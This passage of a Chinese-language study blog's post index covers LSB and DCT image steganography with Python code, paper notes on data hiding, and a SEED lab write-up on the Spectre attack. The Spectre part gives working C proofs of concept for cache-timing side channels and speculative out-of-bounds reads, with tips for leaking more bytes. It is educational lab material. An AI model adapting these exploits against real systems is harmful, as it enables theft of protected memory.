pixel[2] = pixel[2] &amp; 254 | int(binary_data[index])            if pixel[2] &amp; 1 != int(binary_data[index]):                if random.randint(0, 1) == 0:                    if pixel[2] &amp; 1 == 0:                        pixel[2] = (pixel[2] &amp; 254) | (pixel[2] + 1)                    else:                        pixel[2] = (pixel[2] &amp; 254) | (pixel[2] - 1)                else:                    if pixel[2] &amp; 255 == 255:                        pixel[2] = (pixel[2] &amp; 254) | (pixel[2] - 1)                    else:                        pixel[2] = (pixel[2] &amp; 254) | (pixel[2] + 1)            index = index + 1        pixels[k] = tuple(pixel)    new_image = Image.new(image.mode, image.size)    new_image.putdata(pixels)    new_image.save(output_image_path)def png_rgb_ilsb(image_path):    key = [134304, 24906, 1165134, 840434, 1034067, 256626, 960109, 677039, 604987, 1138403, 1252149, 1328829, 693323,           100995, 281079, 808381, 448302, 1262668, 622356, 1360412, 321087, 1424695, 399419, 1260153, 1180374, 1115301,           1420382, 860763, 799633, 764414, 179750, 856208]    extracted_data = &quot;&quot;    img = Image.open(image_path)    pixels = list(img.getdata())    extracted_binary = &quot;&quot;    index = 0    for k in key:        pixel = pixels[k]        if index % 2 == 0:            extracted_binary += str(pixel[0] &amp; 1)            if len(extracted_binary) % 8 == 0:                if binary_to_text(extracted_binary[-8:]) == &#39;\x00&#39;:                    break                extracted_data += binary_to_text(extracted_binary[-8:])            index = index + 1        else:            extracted_binary += str(pixel[2] &amp; 1)            if len(extracted_binary) % 8 == 0:                if binary_to_text(extracted_binary[-8:]) == &#39;\x00&#39;:                    break                extracted_data += binary_to_text(extracted_binary[-8:])            index = index + 1    return extracted_datapng_rgb_lsb(image_path, data_to_hide, output_image_path)data1 = png_rgb_ilsb(output_image_path)print(data1)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 信息隐藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息隐藏 </tag>
            
            <tag> LSB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息隐藏</title>
      <link href="/posts/steg/"/>
      <url>/posts/steg/</url>
      
        <content type="html"><![CDATA[<h1 id="技术概述"><a href="#技术概述" class="headerlink" title="技术概述"></a>技术概述</h1><p>信息隐藏有两个具体的应用方面，隐写术和数字水印。</p><p>隐写术用于秘密的隐藏在正常的载体文件中，比如文档，图片，音频，视频等文件，为了秘密的传输信息而不被发现。</p><p>数字水印一般用作版权保护，将水印可见或者不可见的隐写于载体文件中，当发生盗版时可以溯源盗版方。然而对抗数字水印的对抗技术也很多，比如加入各种噪声，使用手机拍摄文件，这些都是数字水印需要克服的问题。</p><h3 id="视频资料"><a href="#视频资料" class="headerlink" title="视频资料"></a>视频资料</h3><p><a href="https://www.bilibili.com/video/BV1Su411X7vY/">隐写术鉴赏</a></p><p><a href="https://www.bilibili.com/video/BV17v411p7gV/">jpeg-dct</a></p><p><a href="https://www.bilibili.com/video/BV1TZ4y1S7iG/">【中英双字】JPEG算法原理 jpeg图片是如何压缩的？</a></p><p><a href="https://www.bilibili.com/video/BV1iv4y1N7sq/">JPEG不可思议的压缩率——归功于信号处理理论 @圆桌字幕组</a></p><p><a href="https://www.bilibili.com/video/BV17M4y1u7Ek/">JPEG 有损压缩 离散余弦变换 DCT 一条视频讲清楚</a></p><p><a href="https://www.bilibili.com/video/BV1AY411S75C/">“电子包浆”是因为被反复压缩吗？其实没那么简单</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息隐藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息隐藏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像频域隐写技术：DCT系数隐写</title>
      <link href="/posts/steg_dct/"/>
      <url>/posts/steg_dct/</url>
      
        <content type="html"><![CDATA[<h2 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h2><h3 id="二值图-灰度图"><a href="#二值图-灰度图" class="headerlink" title="二值图&#x2F;灰度图"></a>二值图&#x2F;灰度图</h3><p>二值图非常简单，每一个像素使用1比特表示，0代表白，1代表黑。像二维码就可以这样表示节省空间。</p><p>灰度图相比于二值图，多了一些介于黑和白之间的灰色，一般每个像素由8比特表示0-255的范围。</p><p>黑白电视机放映的就是灰度图像，并不只是黑和白的二值图像。</p><h3 id="RGB"><a href="#RGB" class="headerlink" title="RGB"></a>RGB</h3><p>RGB是三原色：红Red，绿Green，蓝Blue的英文首字母缩写。</p><p>调整三个颜色的比例能够表示其他颜色，就和画图时的调色一样。</p><p>在计算机世界，图片由一个个像素点组成，而每个像素点的颜色由RGB表示。</p><p>对于一张24位色深的图片，计算机使用24比特表示每个像素的颜色，RGB三个通道各占8比特。因此RGB表示一个像素点就像这样(0,255,0)。</p><p><img src="/img/steg_dct/image.png" alt="Alt text"></p><h3 id="YUV"><a href="#YUV" class="headerlink" title="YUV"></a>YUV</h3><p>尽管计算机广泛使用RGB表示颜色并以深入人心，但是YUV的颜色表示方法在工业界应用广泛。</p><p>YUV采用明亮度和色度编码颜色，其中Y表示明亮度（Luminance，Luma），而U和V表示色度（Chrominance，Chroma）。其中明度分量可以和色度分量隔离，单独表示一张黑白图片，也就是这点原因YUV可以兼容以前的一些黑白屏幕的设备。另外，由于人眼其实对明度的敏感程度高于色度，因此很多时候，图像处理需要对两个部分做不同处理，比如JPE压缩算法对色度和亮度做了不同方式的压缩。</p><p>YUV和RGB也有一些相似的地方，比如G保存了大部分的明度信息，也就是说RGB明度信息是分散的，U和B，V和R的颜色都有相似。你可能能从它们的转化方程中理解这些信息：</p><p><img src="/img/steg_dct/image-1.png" alt="Alt text"></p><p>如果考虑明度：</p><p><img src="/img/steg_dct/image-2.png" alt="Alt text"></p><pre><code>Y&#39;= 0.299*R&#39; + 0.587*G&#39; + 0.114*B&#39;U&#39;= -0.147*R&#39; - 0.289*G&#39; + 0.436*B&#39; = 0.492*(B&#39;- Y&#39;)V&#39;= 0.615*R&#39; - 0.515*G&#39; - 0.100*B&#39; = 0.877*(R&#39;- Y&#39;)R&#39; = Y&#39; + 1.140*V&#39;G&#39; = Y&#39; - 0.394*U&#39; - 0.581*V&#39;B&#39; = Y&#39; + 2.032*U&#39;</code></pre><p>所以RGB表示的图片和YUV表示的图片都可以转化为一张灰度图片，使用cv2可以轻易完成这个转化过程。</p><pre><code class="python">def show_gray(image_path):    # 读取灰度图    gray_image = cv2.imread(image_path, 0)    # 显示    plt.imshow(gray_image, cmap=&#39;gray&#39;)    plt.title(&#39;Gray Image&#39;)    plt.show()    # 保存    cv2.imwrite(&#39;gray.jpg&#39;, gray_image)</code></pre><h3 id="时空域-频域"><a href="#时空域-频域" class="headerlink" title="时空域&#x2F;频域"></a>时空域&#x2F;频域</h3><p>空域是就是我们观测到的世界，每时每刻都在发生着变化。</p><p>而频域观点下的世界是不变的，音乐世界的一个音符在空域中表现为一段旋律，而在频域世界它是一个不变的音符，音乐在频域就是众多的音符组成，而在空域就很难定义。</p><h3 id="离散余弦变换：DCT"><a href="#离散余弦变换：DCT" class="headerlink" title="离散余弦变换：DCT"></a>离散余弦变换：DCT</h3><p>傅里叶变换通过一些列三角函数拟合其他函数，DCT是傅里叶变换的一种特殊方法，用一些列余弦函数拟合离散的波形。</p><p><a href="https://www.bilibili.com/video/BV17v411p7gV/">jpeg-dct</a></p><p>如果把整张图片看做一个波进行DCT变换：</p><p><img src="/img/steg_dct/image-3.png" alt="Alt text"></p><pre><code class="python">def show_img_dct(img_path):    # 读取灰度图    image = cv2.imread(img_path, 0)    # 进行DCT变换    image_dct = cv2.dct(np.float32(image))    # 显示原图    plt.subplot(1, 2, 1)    plt.imshow(image, cmap=&#39;gray&#39;)    plt.title(&#39;Original Image&#39;)    plt.subplot(1, 2, 2)    plt.imshow(np.log(abs(image_dct)), cmap=&#39;gray&#39;)    plt.title(&#39;DCT Coefficients (log-scale)&#39;)    plt.show()</code></pre><p>但是很多情况都会对图片进行分块以后DCT变换，特别是JPEG压缩中，并且你可以看到每个8*8小方块总是左上角高亮，这代表左上角低频系数DC有较大的值，其他都是接近0的较小值，这对于JPEG压缩有很大意义。</p><p><img src="/img/steg_dct/image-5.png" alt="Alt text"></p><pre><code class="python">def show_blocks_dct(image_path):    # 读取灰度图    gray_image = cv2.imread(image_path, 0)    # 对灰度通道进行8x8分块；并进行DCT和量化处理    h, w = gray_image.shape[:2]    blocks_dct = np.zeros((h, w), dtype=np.float32)    for i in range(0, h, 8):        for j in range(0, w, 8):            block = np.float32(gray_image[i:i + 8, j:j + 8] - 128)            block_dct = cv2.dct(block)            blocks_dct[i:i + 8, j:j + 8] = block_dct    # 显示    plt.subplot(1, 2, 1)    plt.imshow(gray_image, cmap=&#39;gray&#39;)    plt.title(&#39;Original Image&#39;)    plt.subplot(1, 2, 2)    plt.imshow(blocks_dct, cmap=&#39;gray&#39;)    plt.title(&#39;DCT Coefficients (8x8 blocks)&#39;)    plt.show()</code></pre><p><img src="/img/steg_dct/image-4.png" alt="Alt text"></p><h3 id="JPEG压缩原理"><a href="#JPEG压缩原理" class="headerlink" title="JPEG压缩原理"></a>JPEG压缩原理</h3><p>首先将图片从RGB转换为YUV格式进行压缩，因为YUV格式可以更方便的对明度和色度信息进行不同的压缩。</p><p>首先对色度信息进行压缩，由于人眼对于颜色没有那么敏感，因此使用采样的方式对图像进行压缩。</p><p>另外，对于Y通道进行DCT变换，你会发现对于自然啊图片，DCT的高频系数很多是很小的数字或者零，这是因为自然界的明度变换一般较小并且没有很多分明的轮廓，因此高频系数通常很少，并且大量的高频信息对图片质量影响较小，因此考虑使用一个量化矩阵压缩DCT系数矩阵。这样可以使用哈夫曼编码和游程编码对DCT系数矩阵进行压缩即可，这个步骤通常能够进行10倍的压缩。</p><p>量化矩阵是由压缩实验得出，标准的量化矩阵能够尽可能保证图片质量的情况下最大压缩。你可以看到使用量化矩阵以后较小的高频系数AC都变成了0：</p><p>改变i和j的值（i和j必须是8的倍数），你可以看看量化矩阵如何作用于每个8*8分块的DCT系数矩阵，它主要影响右下角的高频系数AC。</p><pre><code class="python"># jpg标准量化矩阵quantization_matrix = np.array([    [16, 11, 10, 16, 24, 40, 51, 61],    [12, 12, 14, 19, 26, 58, 60, 55],    [14, 13, 16, 24, 40, 57, 69, 56],    [14, 17, 22, 29, 51, 87, 80, 62],    [18, 22, 37, 56, 68, 109, 103, 77],    [24, 35, 55, 64, 81, 104, 113, 92],    [49, 64, 78, 87, 103, 121, 120, 101],    [72, 92, 95, 98, 112, 100, 103, 99]])def quantization():    # 读取灰度图    gray_image = cv2.imread(&quot;lena.bmp&quot;, 0)    # 对灰度通道进行8x8分块；并进行DCT和量化处理    h, w = gray_image.shape[:2]    blocks_dct = np.zeros((h, w), dtype=np.float32)    for i in range(0, h, 8):        for j in range(0, w, 8):            block = np.float32(gray_image[i:i + 8, j:j + 8] - 128)            block_dct = cv2.dct(block)            blocks_dct[i:i + 8, j:j + 8] = block_dct / quantization_matrix            if i == 0 and j == 0:                # 显示                plt.subplot(1, 2, 1)                plt.imshow(block_dct, cmap=&#39;gray&#39;)                plt.title(&#39;DCT Coefficients&#39;)                plt.subplot(1, 2, 2)                plt.imshow(blocks_dct[i:i + 8, j:j + 8], cmap=&#39;gray&#39;)                plt.title(&#39;DCT Coefficients (quantization)&#39;)                plt.show()</code></pre><p>然而电脑截图等就会出现很多分明的轮廓，体现到DCT系数就会有很多高频系数并且无法量化为零，这也是为什么JPG对于截图的表现不好而且字体，边界的地方容易糊，因此很多截图实际是使用的PNG格式，PNG格式使用游程编码进行无损压缩，由于电脑截图很多情况下有大量重复像素，因此PNG表现较好。</p><h3 id="DCT隐写"><a href="#DCT隐写" class="headerlink" title="DCT隐写"></a>DCT隐写</h3><p>LSB隐写有一个很大的缺点就是不能够抗压缩，在网络中图片广泛以JPG格式传输，如果不指定传输原图，大概率会被进行JPG压缩后传输。</p><p>在标准量化矩阵量化后的DCT系数矩阵进行隐写，你将得到一个很好的性质，再网络传输中进行量化并不影响隐写内容，如果APP使用标准量化矩阵。</p><p>如果能够对量化之后的DCT系数矩阵上进行隐写，那么隐藏在图片上的信息将不会被压缩。如果结合LSB的思想，那么就是广泛使用的Jsteg隐写，以及一些改进比如F3，F4，F5隐写。</p><p>另外还有一些广泛使用的方法。</p><p>将秘密图片的DCT系数量化后比例叠加到载体图片中，这种方法需要原载体图片才能还原秘密图片。</p><p>在中频部分，利用两个位置的DCT系数大小关系进行01编码，如果dct1&gt;dct2表示0，dct1&lt;dct2表示1，如果大小关系不符合则交换两个dct系数的位置。</p>]]></content>
      
      
      <categories>
          
          <category> 信息隐藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息隐藏 </tag>
            
            <tag> DCT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/steg_review/"/>
      <url>/posts/steg_review/</url>
      
        <content type="html"><![CDATA[<h1 id="技术概述"><a href="#技术概述" class="headerlink" title="技术概述"></a>技术概述</h1>]]></content>
      
      
      <categories>
          
          <category> 信息隐藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息隐藏 </tag>
            
            <tag> 数字水印 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/steg_blind_watermark/"/>
      <url>/posts/steg_blind_watermark/</url>
      
        <content type="html"><![CDATA[<h1 id="技术概述"><a href="#技术概述" class="headerlink" title="技术概述"></a>技术概述</h1>]]></content>
      
      
      <categories>
          
          <category> 信息隐藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息隐藏 </tag>
            
            <tag> 数字水印 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息隐藏</title>
      <link href="/posts/steg_pre/"/>
      <url>/posts/steg_pre/</url>
      
        <content type="html"><![CDATA[<h1 id="技术概述"><a href="#技术概述" class="headerlink" title="技术概述"></a>技术概述</h1><p>信息隐藏有两个具体的应用方面，隐写术和数字水印。</p><p>隐写术用于秘密的隐藏在正常的载体文件中，比如文档，图片，音频，视频等文件，为了秘密的传输信息而不被发现。</p><p>数字水印一般用作版权保护，将水印可见或者不可见的隐写于载体文件中，当发生盗版时可以溯源盗版方。然而对抗数字水印的对抗技术也很多，比如加入各种噪声，使用手机拍摄文件，这些都是数字水印需要克服的问题。</p><h3 id="课程笔记"><a href="#课程笔记" class="headerlink" title="课程笔记"></a>课程笔记</h3><p>(⊙o⊙)…</p><h3 id="视频资料"><a href="#视频资料" class="headerlink" title="视频资料"></a>视频资料</h3><p><a href="https://www.bilibili.com/video/BV1Su411X7vY/">隐写术鉴赏</a></p><p><a href="https://www.bilibili.com/video/BV17v411p7gV/">jpeg-dct</a></p><p><a href="https://www.bilibili.com/video/BV1TZ4y1S7iG/">【中英双字】JPEG算法原理 jpeg图片是如何压缩的？</a></p><p><a href="https://www.bilibili.com/video/BV1iv4y1N7sq/">JPEG不可思议的压缩率——归功于信号处理理论 @圆桌字幕组</a></p><p><a href="https://www.bilibili.com/video/BV17M4y1u7Ek/">JPEG 有损压缩 离散余弦变换 DCT 一条视频讲清楚</a></p><p><a href="https://www.bilibili.com/video/BV1AY411S75C/">“电子包浆”是因为被反复压缩吗？其实没那么简单</a></p><h3 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h3><p>链接1<br>链接2<br>链接3</p>]]></content>
      
      
      <categories>
          
          <category> 信息隐藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息隐藏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文：Techniques for data hiding</title>
      <link href="/posts/steg_techniques_for_data/"/>
      <url>/posts/steg_techniques_for_data/</url>
      
        <content type="html"><![CDATA[<h1 id="论文概述"><a href="#论文概述" class="headerlink" title="论文概述"></a>论文概述</h1><p>Techniques for data hiding</p><h2 id="Patchwork算法"><a href="#Patchwork算法" class="headerlink" title="Patchwork算法"></a>Patchwork算法</h2><h2 id="理论基础"><a href="#理论基础" class="headerlink" title="理论基础"></a>理论基础</h2><p>在图像中随机选取A和B两个点，假设a为A点的亮度，b为B点的亮度，那么：<br><img src="/image.png" alt="alt text"><br>经过多次重复这个操作，S的期望值应该为0。</p><p>具体计算：<br>略。。</p><h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><ol><li>使用伪随机生成器生成秘钥（ai，bi）。</li><li>将a的亮度提高，b的亮度降低（1&#x2F;256-5&#x2F;256d）。</li><li>重复上面步骤n次。（通常来说是10000次）。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 信息隐藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息隐藏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEED：Spectre_Attack</title>
      <link href="/posts/seed_spectre/"/>
      <url>/posts/seed_spectre/</url>
      
        <content type="html"><![CDATA[<p><em>你可以到SEED官网获取实验资料：<a href="https://seedsecuritylabs.org/Labs_20.04/System/Spectre_Attack/">Spectre Attack Lab</a></em></p><h1 id="幽灵攻击"><a href="#幽灵攻击" class="headerlink" title="幽灵攻击"></a>幽灵攻击</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a href="https://www.bilibili.com/video/BV1wW411g7kL/">Intel官方解释CPU幽灵&#x2F;熔断漏洞 | 中英双语字幕</a></p><p>幽灵攻击被发现于2017年并在2018年1月被公开，幽灵攻击允许特殊设计的恶意程序访问其他程序的内存空间，窃取数据。由于幽灵攻击是CPU设计的漏洞，并且这个设计缺陷广泛存在于当时大部分的处理器中，因此修复十分困难，除非更换电脑的CPU。</p><h2 id="基于缓存加速的侧信道攻击"><a href="#基于缓存加速的侧信道攻击" class="headerlink" title="基于缓存加速的侧信道攻击"></a>基于缓存加速的侧信道攻击</h2><h3 id="侧信道攻击"><a href="#侧信道攻击" class="headerlink" title="侧信道攻击"></a>侧信道攻击</h3><p>侧信道攻击利用设备或者系统在处理信息时泄露的物理信息反映出秘密信息，泄露的物理信息可以是时间，耗能，发热等。</p><h3 id="缓存加速"><a href="#缓存加速" class="headerlink" title="缓存加速"></a>缓存加速</h3><p>当内存数据被加载到缓存后，再次访问这个数据时间将会被缓存加速。</p><p><img src="/img/seed_spectre/image.png" alt="Alt text"></p><p>下面代码演示缓存加速的效果。</p><p><em>代码：创建一个数组并初始化，将数组缓存清空；对array(3*4096)和array(7*4096)进行赋值，因此这两个元素被载入缓存；遍历数组获取访问每个元素需要的时间，由于array(3*4096)和array(7*4096)两个元素在缓存中，因此这访问这两个元素的时间应该更短。</em></p><pre><code class="c">#include &lt;emmintrin.h&gt;#include &lt;x86intrin.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;// 40960 items in total;every item of array[] is 1B uint8_t array[10*4096];int main(int argc, const char **argv) &#123;  int junk=0;  // tell the compiler to put time1,time2 into register if possible  register uint64_t time1, time2;  // tell the compiler not to do any optimization on *addr,do not put it into cachae or register  volatile uint8_t *addr;  int i;  // Initialize the array  for(i=0; i&lt;10; i++) array[i*4096]=1;  // FLUSH the array from the CPU cache  for(i=0; i&lt;10; i++) _mm_clflush(&amp;array[i*4096]);  // Access some of the array items  array[3*4096] = 100;  array[7*4096] = 200;  // calcula the time it takes to access each items  for(i=0; i&lt;10; i++) &#123;    addr = &amp;array[i*4096];    time1 = __rdtscp(&amp;junk);       // access time    junk = *addr;    time2 = __rdtscp(&amp;junk) - time1;      printf(&quot;Access time for array[%d*4096]: %d CPU cycles\n&quot;,i, (int)time2);  &#125;  return 0; &#125;</code></pre><p>通过上面的实验可以看到缓存的加速作用，当然加速效果和不同的计算机相关。</p><ul><li><p>元素array[3*4096]和array[7*4096]并不是每次都被缓存加速，可能的原因？</p><p>  缓存中的数据不断的被计算机中的程序更新，元素3和元素7写入缓存后可能已经被其他程序写入的数据覆盖。</p></li><li><p>为什么每个元素之间相差4096字节，如果两个元素是相邻字节可能会发生什么？</p><p>  缓存一般一次性写入64字节的数据，因此将缓存一个字节数据的时候会缓存周围64字节的数据。为了防止缓存一个元素时相邻元素也被缓存，因此数组距离需要至少要大于64字节。</p></li></ul><h3 id="基于缓存加速的侧信道攻击-1"><a href="#基于缓存加速的侧信道攻击-1" class="headerlink" title="基于缓存加速的侧信道攻击"></a>基于缓存加速的侧信道攻击</h3><p>由于缓存加速的存在，访问数据时间较短的数据可以被认为被缓存（操作）过的数据。</p><p><img src="/img/seed_spectre/image-1.png" alt="Alt text"></p><p>下面代码演示如何通过访问时间获取被缓存（操作）数据。</p><p><em>代码：创建一个数组，调用flush函数初始化并清空数组缓存；调用受害者函数访问数组元素array[secret*4096+DELTA];调用reload函数遍历访问数组元素当访问时间小于预知时间CACHE_HIT_THRESHOLD时认为是受害者还是调用的数组元素。</em></p><pre><code class="c">#include &lt;emmintrin.h&gt;#include &lt;x86intrin.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;uint8_t array[256*4096];int temp;unsigned char secret = 94;/* cache hit time threshold assumed*/#define CACHE_HIT_THRESHOLD (80)#define DELTA 1024void victim()&#123;  temp = array[secret*4096 + DELTA];&#125;void flushSideChannel()&#123;  int i;  // Write to array to bring it to RAM to prevent Copy-on-write  for (i = 0; i &lt; 256; i++) array[i*4096 + DELTA] = 1;  //flush the values of the array from cache  for (i = 0; i &lt; 256; i++) _mm_clflush(&amp;array[i*4096 +DELTA]);&#125;void reloadSideChannel()&#123;  int junk=0;  register uint64_t time1, time2;  volatile uint8_t *addr;  int i;  for(i = 0; i &lt; 256; i++)&#123;   addr = &amp;array[i*4096 + DELTA];   time1 = __rdtscp(&amp;junk);   junk = *addr;   time2 = __rdtscp(&amp;junk) - time1;   if (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;    printf(&quot;array[%d*4096 + %d] is in cache.\n&quot;, i, DELTA);        printf(&quot;The Secret = %d.\n&quot;,i);   &#125;  &#125; &#125;int main(int argc, const char **argv)&#123;  flushSideChannel();  victim();  reloadSideChannel();  return (0);&#125;</code></pre><p><em>上面DELTA好像没有啥实际意义，试了一些值0-4095对结果没有影响。</em></p><h2 id="幽灵攻击：结合分支预测和缓存侧信道攻击"><a href="#幽灵攻击：结合分支预测和缓存侧信道攻击" class="headerlink" title="幽灵攻击：结合分支预测和缓存侧信道攻击"></a>幽灵攻击：结合分支预测和缓存侧信道攻击</h2><h3 id="乱序执行：分支预测"><a href="#乱序执行：分支预测" class="headerlink" title="乱序执行：分支预测"></a>乱序执行：分支预测</h3><p>CPU总是被期望处于忙状态，因此它不希望等待计算判断条件，而是提前执行分支语句。如果执行了错误的分支，在回退寄存器和内存的相关数据，但是缓存似乎没有被考虑。</p><p>具体来说CPU会根据过去执行的分支预测将要执行的分支，从而提前执行被预测的分支。比如下图<code>X&lt;size</code>的条件总是满足，即使当某次<code>X&lt;size</code>条件不满足，CPU还是会因为“惯性”提前执行错误分支内的语句。</p><p><img src="/img/seed_spectre/image-2.png" alt="Alt text"></p><p>需要注意的是：注释掉_mm_clflush(&amp;size)的结果，由于size没有被清除缓存，因此条件判断非常快，CPU并没有执行到条件里面的代码。</p><p>另外，如果将训练cpu的代码更改为：i+20，那么CPU将会发现iF后的条件总是不执行，因此在后面就不会提前执行条件分支，实验也不能成功。</p><p><em>代码：创建一个数组；调用flush函数进行初始化并清空数组缓存；构造一个循环总是满足<code>X&lt;size</code>的条件，训练CPU让它对于条件成立的分支具有惯性；清空数组缓存和size变量的缓存；调用victim(97)，现在x&#x3D;97显然不满足小于size&#x3D;10，但是依旧可能被CPU分支预测执行；调用reload函数遍历访问数组，获取小于时间阈值的元素，这个元素就是97。</em></p><pre><code class="c">#include &lt;emmintrin.h&gt;#include &lt;x86intrin.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define CACHE_HIT_THRESHOLD (80)#define DELTA 1024int size = 10;uint8_t array[256*4096];uint8_t temp = 0;void flushSideChannel()&#123;  int i;  // Write to array to bring it to RAM to prevent Copy-on-write  for (i = 0; i &lt; 256; i++) array[i*4096 + DELTA] = 1;  //flush the values of the array from cache  for (i = 0; i &lt; 256; i++) _mm_clflush(&amp;array[i*4096 +DELTA]);&#125;void reloadSideChannel()&#123;  int junk=0;  register uint64_t time1, time2;  volatile uint8_t *addr;  int i;  for(i = 0; i &lt; 256; i++)&#123;    addr = &amp;array[i*4096 + DELTA];    time1 = __rdtscp(&amp;junk);    junk = *addr;    time2 = __rdtscp(&amp;junk) - time1;    if (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;    printf(&quot;array[%d*4096 + %d] is in cache.\n&quot;, i, DELTA);        printf(&quot;The Secret = %d.\n&quot;, i);    &#125;  &#125; &#125;void victim(size_t x)&#123;  if (x &lt; size) &#123;        temp = array[x * 4096 + DELTA];    &#125;&#125;int main() &#123;  int i;  // FLUSH the probing array  flushSideChannel();  // Train the CPU to take the true branch inside victim()  for (i = 0; i &lt; 10; i++) &#123;         victim(i);  &#125;  // Exploit the out-of-order execution  _mm_clflush(&amp;size);  for (i = 0; i &lt; 256; i++)    _mm_clflush(&amp;array[i*4096 + DELTA]);   victim(97);  // RELOAD the probing array  reloadSideChannel();  return (0);&#125;</code></pre><h3 id="幽灵攻击实验及改进"><a href="#幽灵攻击实验及改进" class="headerlink" title="幽灵攻击实验及改进"></a>幽灵攻击实验及改进</h3><p>现在考虑一个内存访问受限制的场景：只允许访问buffer[0]到buffer[9]并且使用下标进行条件判断，对其他区域的访问受到限制。</p><p><img src="/img/seed_spectre/image-3.png" alt="Alt text"></p><ul><li><p>现在考虑如何实现幽灵攻击窃取受限制区域的数据？</p><p>  首先构造一组合法的数组访问条件，训练CPU使得它预测下次的访问依旧是合法访问，在下次访问中，将访问受限制数据写入到数组中，即使这是非法访问，但是在缓存中，数据未被回退，数组中包含受限制数据标识的元素在缓存中，使用reload函数就可以缓存元素的标识也就是受限制数据了。</p></li></ul><p><em>代码：创建一个可以被访问的buffer数组，以及受限制的数据secret；创建一个数组作为侧信道攻击并flush这个数组；训练CPU进行合法的受限制访问；非法访问密码数据区域并将数据作为数组标识，CPU分支预测执行缓存留下数组元素信息；reload侧信道攻击数组，获取缓存元素的标识即秘密数据的值。</em></p><pre><code class="c">#include &lt;emmintrin.h&gt;#include &lt;x86intrin.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;unsigned int bound_lower = 0;unsigned int bound_upper = 9;uint8_t buffer[10] = &#123;0,1,2,3,4,5,6,7,8,9&#125;; char    *secret    = &quot;Some Secret Value&quot;;   uint8_t array[256*4096];#define CACHE_HIT_THRESHOLD (80)#define DELTA 1024// Sandbox Functionuint8_t restrictedAccess(size_t x)&#123;  if (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;     return buffer[x];  &#125; else &#123;     return 0;  &#125; &#125;void flushSideChannel()&#123;  int i;  // Write to array to bring it to RAM to prevent Copy-on-write  for (i = 0; i &lt; 256; i++) array[i*4096 + DELTA] = 1;  //flush the values of the array from cache  for (i = 0; i &lt; 256; i++) _mm_clflush(&amp;array[i*4096 +DELTA]);&#125;void reloadSideChannel()&#123;  int junk=0;  register uint64_t time1, time2;  volatile uint8_t *addr;  int i;  for(i = 0; i &lt; 256; i++)&#123;    addr = &amp;array[i*4096 + DELTA];    time1 = __rdtscp(&amp;junk);    junk = *addr;    time2 = __rdtscp(&amp;junk) - time1;    if (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;        printf(&quot;array[%d*4096 + %d] is in cache.\n&quot;, i, DELTA);        printf(&quot;The Secret = %d(%c).\n&quot;,i, i);    &#125;  &#125; &#125;void spectreAttack(size_t index_beyond)&#123;  int i;  uint8_t s;  volatile int z;  // Train the CPU to take the true branch inside restrictedAccess().  for (i = 0; i &lt; 10; i++) &#123;       restrictedAccess(i);   &#125;  // Flush bound_upper, bound_lower, and array[] from the cache.  _mm_clflush(&amp;bound_upper);  _mm_clflush(&amp;bound_lower);  for (i = 0; i &lt; 256; i++)  &#123; _mm_clflush(&amp;array[i*4096 + DELTA]); &#125;  for (z = 0; z &lt; 100; z++)  &#123;   &#125;  // Ask restrictedAccess() to return the secret in out-of-order execution.   s = restrictedAccess(index_beyond);    array[s*4096 + DELTA] += 88;  &#125;int main() &#123;  flushSideChannel();  size_t index_beyond = (size_t)(secret - (char*)buffer);    printf(&quot;secret: %p \n&quot;, secret);  printf(&quot;buffer: %p \n&quot;, buffer);  printf(&quot;index of secret (out of bound): %ld \n&quot;, index_beyond);  spectreAttack(index_beyond);  reloadSideChannel();  return (0);&#125;</code></pre><p>改进</p><ul><li><p>结果并不一定是稳定的，因为CPU训练并不是每次都会有效，并且缓存可能被覆盖，条件判断可能在分支语句执行数组赋值前完成，需要运行多次程序可能才能获取正确的结果，因此在程序中写个循环多次运行程序，取出现最多的结果。</p></li><li><p>现在程序只能获取秘密数据中的一个字节，需要获取其他部分。调整index_beyond以获取完整的秘密数据获取其他区域的数据。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> SEED </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEED </tag>
            
            <tag> Spectre_Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全：SQL注入</title>
      <link href="/posts/web_sqlinjection/"/>
      <url>/posts/web_sqlinjection/</url>
      
